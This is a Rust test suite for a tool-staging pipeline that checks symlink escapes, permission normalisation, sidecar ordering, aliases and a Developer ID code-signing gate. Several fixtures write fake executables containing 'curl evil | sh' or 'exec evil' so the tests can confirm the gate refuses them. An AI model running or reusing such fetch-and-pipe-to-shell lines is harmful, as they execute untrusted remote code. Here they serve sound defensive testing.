        let root = d.join(label);
        lay(
            &root,
            "Bad.app/Contents/MacOS/x",
            b"#!/bin/sh\nexit 0\n",
            0o755,
        );
        lay_link(&root, "Bad.app/Contents/Resources/escape", target);
        match vet_copied_tree(&root, &root.join("Bad.app")) {
            Ok(()) => assert!(ok, "{label}: an escaping link was admitted"),
            Err(StageError::Extract(ExtractError::Rejected(_, link))) if !ok => assert_eq!(
                link,
                Path::new("Bad.app/Contents/Resources/escape"),
                "{label}"
            ),
            Err(e) => panic!("{label}: {e:?}"),
        }
    }
}

#[cfg(target_os = "macos")]
#[test]
fn dmg_copy_walk_gives_the_bundle_the_archive_lanes_modes() {
    use std::os::unix::fs::PermissionsExt as _;
    const FILES: &[(&str, &[u8], u32, u32)] = &[
        ("Foo.app/Contents/MacOS/foo", b"#!/bin/sh\n", 0o4755, 0o755),
        ("Foo.app/Contents/Resources/shared", b"w", 0o666, 0o644),
        ("Foo.app/Contents/Resources/sealed", b"r", 0o400, 0o644),
        ("Foo.app/Contents/Resources/locked", b"l", 0o666, 0o644),
        ("Foo.app/Contents/Resources/pinned", b"p", 0o644, 0o644),
        (
            "Foo.app/Contents/Plugins/helper",
            b"#!/bin/sh\n",
            0o771,
            0o755,
        ),
    ];
    const DIRS: &[(&str, u32)] = &[
        ("Foo.app/Contents/Plugins", 0o1777),
        ("Foo.app/Contents", 0o775),
        ("Foo.app", 0o700),
    ];
    const FLAGGED: &[(&str, &str)] = &[
        ("Foo.app/Contents/Resources/locked", "uchg"),
        ("Foo.app/Contents/Resources/pinned", "uappnd"),
        ("Foo.app/Contents/Plugins", "uchg"),
    ];
    struct Unflag<'a>(&'a Path);
    impl Drop for Unflag<'_> {
        fn drop(&mut self) {
            let _ = aterm_uds::spawnfd::command("/usr/bin/chflags")
                .arg("-R")
                .arg("nouchg,nouappnd")
                .arg(self.0)
                .stdin(aterm_uds::spawnfd::Stdio::null())
                .output();
        }
    }
    let d = tmp("dmg-modes");
    let _unflag = Unflag(&d);
    let root = d.join("stage");
    for (rel, body, copied, _) in FILES {
        lay(&root, rel, body, *copied);
    }
    lay_link(&root, "Foo.app/Contents/current", "MacOS/foo");
    for (rel, copied) in DIRS {
        std::fs::set_permissions(root.join(rel), std::fs::Permissions::from_mode(*copied)).unwrap();
    }
    for (rel, flag) in FLAGGED {
        let out = aterm_uds::spawnfd::command("/usr/bin/chflags")
            .arg(flag)
            .arg(root.join(rel))
            .stdin(aterm_uds::spawnfd::Stdio::null())
            .output()
            .unwrap();
        assert!(out.status.success(), "chflags {flag} {rel}: {out:?}");
    }
    let mode_of = |rel: &str| {
        std::fs::symlink_metadata(root.join(rel))
            .unwrap()
            .permissions()
            .mode()
            & 0o7777
    };
    let binding_flags_of = |rel: &str| {
        use std::os::macos::fs::MetadataExt as _;
        std::fs::symlink_metadata(root.join(rel))
            .unwrap()
            .st_flags()
            & (libc::UF_IMMUTABLE | libc::UF_APPEND)
    };
    vet_copied_tree(&root, &root.join("Foo.app")).unwrap();
    for (rel, _, copied, admitted) in FILES {
        assert_eq!(mode_of(rel), *admitted, "{rel}: copied {copied:o}");
    }
    for (rel, copied) in DIRS {
        assert_eq!(mode_of(rel), 0o755, "{rel}: copied {copied:o}");
    }
    for (rel, flag) in FLAGGED {
        assert_eq!(binding_flags_of(rel), 0, "{rel}: copied {flag}");
    }
    assert_eq!(
        std::fs::read_link(root.join("Foo.app/Contents/current")).unwrap(),
        Path::new("MacOS/foo"),
        "a link is left as it is"
    );
}

#[cfg(target_os = "macos")]
#[test]
fn dmg_copy_walk_gives_every_entry_the_stage_roots_owner_and_group() {
    use std::os::unix::fs::MetadataExt as _;
    const ENTRIES: [&str; 4] = [
        "Foo.app/Contents/MacOS/foo",
        "Foo.app/Contents/Resources",
        "Foo.app/Contents/current",
        "Foo.app",
    ];
    let d = tmp("dmg-owner");
    let root = d.join("stage");
    std::fs::create_dir_all(&root).unwrap();
    // A scratch under /tmp can inherit wheel even when this user is not a member. Choose
    // an allowed group on this owned stage before populating it, so the deliberate group
    // changes below can be restored without root privileges.
    // SAFETY: getegid reads this process's effective group and cannot fail.
    let group = unsafe { libc::getegid() };
    std::os::unix::fs::lchown(&root, None, Some(group)).unwrap();
    lay(&root, "Foo.app/Contents/MacOS/foo", b"#!/bin/sh\n", 0o755);
    lay(&root, "Foo.app/Contents/Resources/r", b"r", 0o644);
    lay_link(&root, "Foo.app/Contents/current", "MacOS/foo");
    let stage = std::fs::symlink_metadata(&root).unwrap();
    let mut groups = [0 as libc::gid_t; 64];
    // SAFETY: `groups` is a writable buffer of exactly the 64 entries the call is told.
    let n = unsafe { libc::getgroups(64, groups.as_mut_ptr()) };
    let candidates = groups[..usize::try_from(n).unwrap_or(0)]
        .iter()
        .copied()
        .chain([12])
        .filter(|g| *g != stage.gid());
    let mut other = None;
    for gid in candidates {
        if std::os::unix::fs::lchown(root.join(ENTRIES[0]), None, Some(gid)).is_ok() {
            other = Some(gid);
            break;
        }
    }
    let other = other.expect("a group of this user's other than the stage root's");
    for rel in ENTRIES {
        std::os::unix::fs::lchown(root.join(rel), None, Some(other)).unwrap();
    }
    let ids = |rel: &str| {
        let m = std::fs::symlink_metadata(root.join(rel)).unwrap();
        (m.uid(), m.gid())
    };
    for rel in ENTRIES {
        assert_eq!(ids(rel).1, other, "{rel}: laid in group {other}");
    }

    vet_copied_tree(&root, &root.join("Foo.app")).unwrap();
    for rel in ENTRIES {
        assert_eq!(
            ids(rel),
            (stage.uid(), stage.gid()),
            "{rel}: copied in group {other}"
        );
    }
}

#[cfg(unix)]
#[test]
fn the_staging_scratch_is_private_until_the_swap_and_the_build_is_0755() {
    use std::os::unix::fs::PermissionsExt as _;
    let mode_of = |p: &Path| std::fs::symlink_metadata(p).unwrap().permissions().mode() & 0o7777;
    let b = bundle("scratch-mode");
    let build = b.build();
    let seen = std::cell::Cell::new(None);
    let pre_swap = |incoming: &Path| -> Result<(), StageError> {
        seen.set(Some(mode_of(incoming)));
        Ok(())
    };
    let hooks = StageHooks {
        pre_swap: Some(&pre_swap),
        sidecars: None,
        aliases: &[],
        npm_package: None,
    };
    verify_and_stage(&b.art, &b.archive, &build, &hooks).unwrap();
    assert_eq!(
        seen.get(),
        Some(0o700),
        "the scratch as the stage filled it"
    );
    assert_eq!(mode_of(&build), 0o755, "the build it was swapped in as");
}

#[test]
fn a_failed_sidecar_folder_flush_leaves_the_build_unmarked() {
    use aterm_durable::seam::{EIO, ENOTSUP, FailingDirs};
    let b = bundle("sidecar-flush-fails");
    let build = b.build();
    let sidecars = |root: &str| Ok(vendor_record(root));
    let hooks = StageHooks {
        sidecars: Some(&sidecars),
        ..StageHooks::NONE
    };
    {
        let _eio = FailingDirs::after(1, EIO);
        let error = verify_and_stage(&b.art, &b.archive, &build, &hooks).unwrap_err();
        assert!(matches!(error, StageError::Io(_)));
    }
    assert!(
        !crate::store::build_is_complete(&build),
        "no ready marker vouched for the unordered sidecar"
    );
    assert!(
        crate::store::sidecar_path(&build, crate::store::VENDOR_SIDECAR_SUFFIX)
            .unwrap()
            .is_file()
    );
    {
        let _refused = FailingDirs::with(ENOTSUP);
        verify_and_stage(&b.art, &b.archive, &build, &hooks).unwrap();
    }
    assert!(crate::store::build_is_complete(&build));
}

fn vendor_record(root: &str) -> Vec<(&'static str, Vec<u8>)> {
    let mut body = String::from("tree_root = \"");
    body.push_str(root);
    body.push_str("\"\n");
    vec![(crate::store::VENDOR_SIDECAR_SUFFIX, body.into_bytes())]
}

#[test]
fn hooks_run_before_the_swap_and_sidecars_land_before_the_marker() {
    let b = bundle("hooks-order");
    let build = b.build();
    let seen: std::cell::RefCell<Vec<String>> = std::cell::RefCell::new(Vec::new());
    let pre_swap = |incoming: &Path| -> Result<(), StageError> {
        assert!(incoming.join("bin/ay").is_file(), "the verified tree");
        assert_ne!(incoming, build.as_path());
        assert!(!build.exists(), "nothing swapped yet");
        assert!(!crate::store::build_is_complete(&build));
        seen.borrow_mut().push("pre_swap".into());
        Ok(())
    };
    let sidecars = |root: &str| {
        seen.borrow_mut().push("sidecars".into());
        Ok(vendor_record(root))
    };
    let hooks = StageHooks {
        pre_swap: Some(&pre_swap),
        sidecars: Some(&sidecars),
        aliases: &[],
        npm_package: None,
    };
    let recording = aterm_durable::seam::Recording::start();
    let root = verify_and_stage(&b.art, &b.archive, &build, &hooks).unwrap();
    let (flushes, what): (&[aterm_durable::Flush], &str) = if cfg!(windows) {
        use aterm_durable::Flush::{Durable as D, Ordered as O};
        (
            &[D, O, D, O, D, D, O],
            "the tree's file, the swap's unmark, the sidecar, its folder, the declared \
             modes, the marker, its folder (a folder's flush is only noted on Windows)",
        )
    } else {
        (
            &[aterm_durable::Flush::Ordered; 3],
            "the swap's unmark, the sidecars, the marker",
        )
    };
    assert_eq!(recording.take(), flushes, "{what}");
    drop(recording);
    assert_eq!(root, b.art.tree_root, "the verified root comes back");
    assert_eq!(*seen.borrow(), ["pre_swap", "sidecars"]);
    assert!(crate::store::build_is_complete(&build));
    let record = crate::store::sidecar_path(&build, crate::store::VENDOR_SIDECAR_SUFFIX).unwrap();
    assert_eq!(
        std::fs::read_to_string(&record).unwrap(),
        String::from_utf8(vendor_record(&root).remove(0).1).unwrap()
    );
}

/// A copy of another build's tree is staged only when it folds to the root that build's
/// record names and holds nothing a stage would demote: anything else is a drift that lays
/// nothing, leaves no scratch, memoizes nothing and never touches the source.
#[cfg(unix)]
#[test]
fn stage_from_tree_lays_only_a_tree_that_folds_to_its_source_root() {
    use std::os::unix::fs::PermissionsExt as _;
    let dir = tmp("from-tree");
    let src = dir.join("store/codex/7");
    std::fs::create_dir_all(src.join("bin")).unwrap();
    let exe = crate::vendor_direct::lane::world::native_exe("codex");
    let file = |rel: &str, bytes: &[u8], mode: u32| {
        std::fs::write(src.join(rel), bytes).unwrap();
        std::fs::set_permissions(src.join(rel), std::fs::Permissions::from_mode(mode)).unwrap();
    };
    file("bin/codex", &exe, 0o755);
    file("NOTICE.md", b"# Notices\n", 0o644);
    std::os::unix::fs::symlink("codex", src.join("bin/codex-link")).unwrap();
    let root = tree_root(&src).unwrap();
    let art = artifact(&"a".repeat(64), "");
    let demote = |tree: &Path| crate::macho::demote_foreign_executables(tree).map(drop);
    let hooks = StageHooks {
        pre_swap: Some(&demote),
        sidecars: None,
        aliases: &[("codex-old", "codex")],
        npm_package: None,
    };
    let laid = std::cell::Cell::new(0);
    let count = || laid.set(laid.get() + 1);
    let nothing_laid = |build: &Path| {
        assert!(std::fs::symlink_metadata(build).is_err(), "no build");
        assert!(scratch_beside(build).is_empty(), "no scratch");
        assert!(crate::store::stage_refusal(build).is_none(), "no memo");
    };

    let build = dir.join("store/codex-old/7");
    let wrong = stage_from_tree(&src, &"b".repeat(64), &art, &build, &hooks, &count).unwrap();
    assert!(matches!(wrong, FromTree::Drift(_)), "{wrong:?}");
    nothing_laid(&build);
    assert_eq!(laid.get(), 0);

    let staged = stage_from_tree(&src, &root, &art, &build, &hooks, &count).unwrap();
    assert_eq!(laid.get(), 1);
    assert_eq!(staged, FromTree::Staged(tree_root(&build).unwrap()));
    assert!(crate::store::build_is_complete(&build));
    assert!(crate::clone::is_clone_of(
        &src.join("bin/codex"),
        &build.join("bin/codex")
    ));
    assert_eq!(std::fs::read(build.join("bin/codex-old")).unwrap(), exe);
    assert_eq!(
        std::fs::read_link(build.join("bin/codex-link")).unwrap(),
        Path::new("codex")
    );
    assert_eq!(tree_root(&src).unwrap(), root, "the source is untouched");

    file("bin/helper", b"#!/bin/sh\nexec true\n", 0o755);
    let root = tree_root(&src).unwrap();
    let other = dir.join("store/codex-old/8");
    let foreign = stage_from_tree(&src, &root, &art, &other, &hooks, &count).unwrap();
    assert!(matches!(foreign, FromTree::Drift(_)), "{foreign:?}");
    nothing_laid(&other);
    assert_eq!(laid.get(), 1);
    assert_eq!(
        std::fs::metadata(src.join("bin/helper"))
            .unwrap()
            .permissions()
            .mode()
            & 0o777,
        0o755,
        "the source keeps its mode"
    );
}

#[test]
fn a_stage_stopped_between_swap_and_marker_leaves_no_complete_build() {
    let b = bundle("hooks-kill");
    let build = b.build();
    let record = crate::store::sidecar_path(&build, crate::store::VENDOR_SIDECAR_SUFFIX).unwrap();
    std::fs::create_dir_all(&record).unwrap();
    let sidecars = |root: &str| Ok(vendor_record(root));
    let hooks = StageHooks {
        pre_swap: None,
        sidecars: Some(&sidecars),
        aliases: &[],
        npm_package: None,
    };
    let err = verify_and_stage(&b.art, &b.archive, &build, &hooks).unwrap_err();
    assert!(matches!(err, StageError::Io(_)), "{err:?}");
    assert!(build.join("bin/ay").is_file(), "the swap had happened");
    assert!(
        !crate::store::build_is_complete(&build),
        "but nothing marked it"
    );

    std::fs::remove_dir(&record).unwrap();
    verify_and_stage(&b.art, &b.archive, &build, &hooks).unwrap();
    assert!(crate::store::build_is_complete(&build));
    assert!(record.is_file());
}

#[cfg(unix)]
fn fat_macho(nfat: u32) -> Vec<u8> {
    let mut bytes = 0xCAFE_BABEu32.to_be_bytes().to_vec();
    bytes.extend_from_slice(&nfat.to_be_bytes());
    for i in 0..nfat {
        for word in [0x0100_000C, 0, 0x1_0000 + i * 0x1000, 0x1000, 12] {
            bytes.extend_from_slice(&u32::to_be_bytes(word));
        }
    }
    bytes
}

#[cfg(unix)]
fn thin_macho() -> Vec<u8> {
    let mut thin = 0xCFFA_EDFEu32.to_be_bytes().to_vec();
    thin.extend_from_slice(&[0u8; 60]);
    thin
}

#[cfg(unix)]
fn gate_with(
    tree: &Path,
    exposes: &[&str],
    verdict: &dyn Fn(&str) -> Result<(), aterm_update_core::codesign::CodesignError>,
) -> (Result<(), StageError>, Vec<String>) {
    let asked = std::cell::RefCell::new(Vec::new());
    let verify = |path: &Path, _deadline: std::time::Instant| {
        let rel = path
            .strip_prefix(tree)
            .unwrap()
            .to_string_lossy()
            .replace('\\', "/");
        asked.borrow_mut().push(rel.clone());
        verdict(&rel)
    };
    let exposes: Vec<String> = exposes.iter().map(|t| (*t).to_string()).collect();
    let result = check_developer_id(tree, "Q6L2SF6YDW", &exposes, &verify);
    (result, asked.into_inner())
}

#[cfg(unix)]
fn unsigned() -> aterm_update_core::codesign::CodesignError {
    aterm_update_core::codesign::CodesignError::Refused {
        code: Some(1),
        stderr: "x: code object is not signed at all\n".into(),
    }
}

#[cfg(unix)]
#[test]
fn the_gate_passes_a_tree_whose_every_macho_verifies_and_asks_about_each_once() {
    let d = tmp("devid-pass");
    lay(&d, "bin/codex", &thin_macho(), 0o755);
    lay(&d, "bin/codex-code-mode-host", &thin_macho(), 0o755);
    lay(&d, "codex-path/rg", &fat_macho(2), 0o755);
    lay(
        &d,
        "codex-resources/voice/runtime.json",
        b"{\"a\": 1}\n",
        0o644,
    );
    lay(&d, "codex-resources/voice/NOTICE.md", b"# Notices\n", 0o644);
    let (result, asked) = gate_with(&d, &["codex"], &|_| Ok(()));
    result.expect("every Mach-O verifies and the entry is one of them");
    assert_eq!(
        asked,
        ["bin/codex", "bin/codex-code-mode-host", "codex-path/rg"]
    );
}

#[cfg(unix)]
#[test]
fn an_entry_that_is_not_a_verified_macho_or_a_script_helper_is_refused() {
    let pass = |_: &str| -> Result<(), aterm_update_core::codesign::CodesignError> { Ok(()) };
    let refused_as = |d: &Path, exposes: &[&str], want: &str| match gate_with(d, exposes, &pass).0 {
        Err(StageError::SignerRefused(m)) => assert!(m.starts_with(want), "{m}"),
        other => panic!("{want}: {other:?}"),
    };
    let entry_refusal = "bin/codex ";

    let d = tmp("devid-entry");
    lay(&d, "bin/codex-code-mode-host", &thin_macho(), 0o755);
    lay(&d, "bin/codex", b"curl evil | sh\n", 0o755);
    refused_as(&d, &["codex"], entry_refusal);

    std::fs::remove_file(d.join("bin/codex")).unwrap();
    refused_as(&d, &["codex"], entry_refusal);

    lay(&d, "payload.txt", b"curl evil | sh\n", 0o755);
    lay_link(&d, "bin/codex", "../payload.txt");
    refused_as(&d, &["codex"], entry_refusal);

    std::fs::remove_file(d.join("bin/codex")).unwrap();
    std::fs::remove_file(d.join("payload.txt")).unwrap();
    lay(&d, "bin/codex", &thin_macho(), 0o755);
    gate_with(&d, &["codex"], &pass).0.unwrap();
    refused_as(&d, &["codex", "codex-exec"], "bin/codex-exec ");

    lay(&d, "codex-path/rg", b"#!/bin/sh\nexec evil\n", 0o755);
    refused_as(&d, &["codex"], "codex-path/rg ");
}

#[cfg(unix)]
#[test]
fn an_alias_is_a_clone_the_gate_judges_and_a_symlinked_one_is_refused() {
    let pass = |_: &str| -> Result<(), aterm_update_core::codesign::CodesignError> { Ok(()) };
    let d = tmp("devid-alias");
    lay(&d, "bin/codex", &thin_macho(), 0o755);
    lay_link(&d, "bin/codex-old", "codex");
    match gate_with(&d, &["codex-old"], &pass).0 {
        Err(StageError::SignerRefused(m)) => {
            assert!(m.contains("is a symlink to a Mach-O"), "{m}");
        }
        other => panic!("a symlinked alias passed the gate: {other:?}"),
    }
    std::fs::remove_file(d.join("bin/codex-old")).unwrap();
    let mut modes = DeclaredModes::new();
    lay_aliases(&d, &[("codex-old", "codex")], &mut modes).unwrap();
    let alias = std::fs::symlink_metadata(d.join("bin/codex-old")).unwrap();
    assert!(alias.file_type().is_file(), "a regular file, never a link");
    assert_eq!(
        std::fs::read(d.join("bin/codex-old")).unwrap(),
        thin_macho()
    );
    let (result, asked) = gate_with(&d, &["codex-old"], &pass);
    result.expect("the clone is a verified Mach-O and the entry its shim runs");
    assert_eq!(asked, ["bin/codex", "bin/codex-old"]);
    let refuse_alias = |rel: &str| {
        if rel == "bin/codex-old" {
            Err(unsigned())
        } else {
            Ok(())
        }
    };
    assert!(matches!(
        gate_with(&d, &["codex-old"], &refuse_alias).0,
        Err(StageError::SignerRefused(_))
    ));
}

#[cfg(unix)]
#[test]
fn an_alias_of_nothing_a_link_or_a_taken_name_is_refused() {
    let d = tmp("alias-refusals");
    lay(&d, "real", &thin_macho(), 0o755);
    let refused = |aliases: &[(&str, &str)], want: &str| match lay_aliases(
        &d,
        aliases,
        &mut DeclaredModes::new(),
    ) {
        Err(StageError::Payload(m)) => assert!(m.contains(want), "{want}: {m}"),
        other => panic!("{aliases:?}: {other:?}"),
    };
    refused(&[("codex-old", "codex")], "bin/codex is not a regular file");
    std::fs::create_dir_all(d.join("bin/codex")).unwrap();
    refused(&[("codex-old", "codex")], "bin/codex is not a regular file");
    std::fs::remove_dir(d.join("bin/codex")).unwrap();
    lay_link(&d, "bin/codex", "../real");
    refused(&[("codex-old", "codex")], "bin/codex is not a regular file");
    std::fs::remove_file(d.join("bin/codex")).unwrap();
    lay(&d, "bin/codex", &thin_macho(), 0o755);
    lay(&d, "bin/codex-old", b"the vendor's own\n", 0o644);
    refused(&[("codex-old", "codex")], "already has one");
    assert_eq!(
        std::fs::read(d.join("bin/codex-old")).unwrap(),
        b"the vendor's own\n",
        "a refusal lays nothing over the vendor's file"
    );
    refused(&[("../codex-old", "codex")], "not a tool name");
    refused(&[("codex-old", "")], "not a tool name");
}

#[cfg(unix)]
#[test]
fn the_stage_lays_its_aliases_before_the_gate_and_folds_them_into_its_root() {
    let b = bundle("alias-stage");
    let build = b.build();
    let gated = std::cell::Cell::new(false);
    let pre_swap = |incoming: &Path| -> Result<(), StageError> {
        let alias = std::fs::symlink_metadata(incoming.join("bin/ay-old"));
        gated.set(alias.is_ok_and(|m| m.file_type().is_file()));
        Ok(())
    };
    let handed = std::cell::RefCell::new(String::new());
    let sidecars = |root: &str| -> Result<Vec<(&'static str, Vec<u8>)>, StageError> {
        root.clone_into(&mut handed.borrow_mut());
        Ok(Vec::new())
    };
    let hooks = StageHooks {
        pre_swap: Some(&pre_swap),
        sidecars: Some(&sidecars),
        aliases: &[("ay-old", "ay")],
        npm_package: None,
    };
    let root = verify_and_stage(&b.art, &b.archive, &build, &hooks).unwrap();
    assert!(gated.get(), "the gate saw the alias as a regular file");
    let (alias, entry) = (build.join("bin/ay-old"), build.join("bin/ay"));
    let meta = |p: &Path| std::fs::symlink_metadata(p).unwrap();
    assert!(meta(&alias).file_type().is_file());
    assert_eq!(meta(&alias).permissions(), meta(&entry).permissions());
    assert_eq!(
        std::fs::read(&alias).unwrap(),
        std::fs::read(&entry).unwrap()
    );
    assert_eq!(
        root,
        tree_root(&build).unwrap(),
        "the root is the tree as built"
    );
    assert_eq!(*handed.borrow(), root, "and the sidecars were handed it");
    assert_ne!(root, b.art.tree_root, "the alias joined the root");

    let plain = bundle("alias-stage-control");
    let root = verify_and_stage(
        &plain.art,
        &plain.archive,
        &plain.build(),
        &StageHooks::NONE,
    )
    .unwrap();
    assert_eq!(root, plain.art.tree_root);

    let missing = bundle("alias-stage-missing");
    let hooks = StageHooks {
        aliases: &[("ay-old", "nope")],
        npm_package: None,
        ..StageHooks::NONE
    };
    let err =
        verify_and_stage(&missing.art, &missing.archive, &missing.build(), &hooks).unwrap_err();
    assert!(matches!(&err, StageError::Payload(m) if m.contains("is not a regular file")));
    assert!(!missing.build().exists(), "nothing was swapped in");
    assert!(!crate::store::build_is_complete(&missing.build()));
}

#[cfg(target_os = "macos")]
#[test]
fn an_executable_that_is_not_a_macho_is_refused_until_demoted() {
    let d = tmp("devid-exec");
    lay(&d, "bin/codex", &thin_macho(), 0o755);
    lay(
        &d,
        "codex-resources/voice/runtime.json",
        b"{\"a\": 1}\n",
        0o755,
    );
    let pass = |_: &str| -> Result<(), aterm_update_core::codesign::CodesignError> { Ok(()) };
    match gate_with(&d, &["codex"], &pass).0 {
        Err(StageError::SignerRefused(m)) => {
            assert!(m.starts_with("codex-resources/voice/runtime.json "), "{m}")
        }
        other => panic!("{other:?}"),
    }
    assert!(crate::macho::demote_foreign_executables(&d).unwrap());
    let mode = |rel: &str| {
        use std::os::unix::fs::PermissionsExt as _;
        std::fs::metadata(d.join(rel)).unwrap().permissions().mode() & 0o7777
    };
    assert_eq!(mode("codex-resources/voice/runtime.json"), 0o644);
    assert_eq!(mode("bin/codex"), 0o755, "a Mach-O keeps its bits");
    assert!(
        !crate::macho::demote_foreign_executables(&d).unwrap(),
        "idempotent"
    );
    gate_with(&d, &["codex"], &pass).0.unwrap();
}

#[cfg(target_os = "linux")]
#[test]
fn linux_demotion_keeps_elf_and_demotes_macho_and_executable_data() {
    use std::os::unix::fs::PermissionsExt as _;
    let d = tmp("linux-exec");
    let elf = crate::vendor_direct::lane::world::native_exe("codex");
    lay(&d, "bin/codex", &elf, 0o755);
    lay(&d, "foreign/macos-helper", &thin_macho(), 0o755);
    lay(&d, "codex-resources/runtime.json", b"{}\n", 0o755);
    assert!(crate::macho::demote_foreign_executables(&d).unwrap());
    let mode = |rel: &str| std::fs::metadata(d.join(rel)).unwrap().permissions().mode() & 0o7777;
    assert_eq!(mode("bin/codex"), 0o755);
    assert_eq!(std::fs::read(d.join("bin/codex")).unwrap(), elf);
    assert_eq!(mode("foreign/macos-helper"), 0o644);
    assert_eq!(mode("codex-resources/runtime.json"), 0o644);
    assert!(!crate::macho::demote_foreign_executables(&d).unwrap());
}

#[cfg(unix)]
#[test]
fn the_gate_maps_each_codesign_outcome() {
    use aterm_update_core::codesign::CodesignError;
    let d = tmp("devid-outcomes");
    lay(&d, "bin/claude", &thin_macho(), 0o755);
    let cases: [(fn() -> CodesignError, Want); 6] = [
        (unsigned, |e| matches!(e, StageError::SignerRefused(_))),
        (
            || CodesignError::Refused {
                code: Some(3),
                stderr: "x: code failed to satisfy specified code requirement(s)\n".into(),
            },
            |e| matches!(e, StageError::SignerRefused(_)),
        ),
        (
            || CodesignError::InvalidTeam("not a team".into()),
            |e| matches!(e, StageError::Payload(_)),
        ),
        (
            || CodesignError::TimedOut,
            |e| matches!(e, StageError::VerifyDeferred(m) if m.starts_with("bin/claude")),
        ),
        (
            || CodesignError::Refused {
                code: Some(1),
                stderr: "bin/claude: Permission denied\n".into(),
            },
            |e| matches!(e, StageError::Io(io) if io.to_string().starts_with("bin/claude")),
        ),
        (
            || CodesignError::Unsupported,
            |e| matches!(e, StageError::Io(_)),
        ),
    ];
    for (i, (outcome, want)) in cases.into_iter().enumerate() {
        let err = gate_with(&d, &["claude"], &|_| Err(outcome()))
            .0
            .unwrap_err();
        assert!(want(&err), "case {i}: {err:?}");
    }
}

#[cfg(unix)]
#[test]
fn the_gate_gives_each_macho_a_deadline_scaled_by_its_size() {
    use aterm_update_core::codesign::{VERIFY_TIMEOUT, verify_timeout_for};
    let exposes = vec![String::from("codex")];
    let started = std::time::Instant::now();
    let deadline_for = |len: Option<u64>| {
        let one = tmp("devid-deadline");
        lay(&one, "bin/codex", &thin_macho(), 0o755);
        if let Some(len) = len {
            std::fs::OpenOptions::new()
                .write(true)
                .open(one.join("bin/codex"))
                .unwrap()
                .set_len(len)
                .unwrap();
        }
        let given = std::cell::Cell::new(None);
        let answer = |_: &Path, deadline: std::time::Instant| {
            given.set(Some(deadline));
            Ok(())
        };
        check_signed_tree_with_clock(
            &one,
            "Developer ID team 2DC432GLL2",
            &exposes,
            &answer,
            || started,
        )
        .unwrap();
        given.get().unwrap()
    };
    let big: u64 = 238_223_808;
    let large = deadline_for(Some(big));
    assert_eq!(large, started + verify_timeout_for(big));
    let small = deadline_for(None);
    assert_eq!(small, started + VERIFY_TIMEOUT);
}

#[cfg(unix)]
#[test]
fn a_gate_with_no_or_a_bad_exposed_tool_is_a_payload_error() {
    let d = tmp("devid-exposes");
    lay(&d, "bin/claude", &thin_macho(), 0o755);
    let (result, asked) = gate_with(&d, &[], &|_| Ok(()));
    assert!(matches!(result, Err(StageError::Payload(_))), "{result:?}");
    assert!(asked.is_empty());
    let (result, asked) = gate_with(&d, &["../claude"], &|_| Ok(()));
    assert!(matches!(result, Err(StageError::Payload(_))), "{result:?}");
    assert!(asked.is_empty());
}

#[cfg(target_os = "macos")]
#[test]
fn the_developer_id_gate_refuses_no_macho_and_an_unsigned_one() {
    let gate = developer_id_gate("Q6L2SF6YDW", &["claude"], codesign_team_check);
    let d = tmp("devid-shapes");
    lay(&d, "bin/claude", b"echo hi\n", 0o644);
    assert!(matches!(gate(&d), Err(StageError::SignerRefused(_))));
    std::fs::write(d.join("bin/claude"), thin_macho()).unwrap();
    match gate(&d) {
        Err(StageError::SignerRefused(m)) => assert!(m.starts_with("bin/claude "), "{m}"),
        other => panic!("{other:?}"),
    }
}

#[cfg(not(target_os = "macos"))]
#[test]
fn off_macos_the_developer_id_gate_passes() {
    let d = tmp("devid-off");
    assert!(developer_id_gate("Q6L2SF6YDW", &["claude"], codesign_team_check)(&d).is_ok());
}
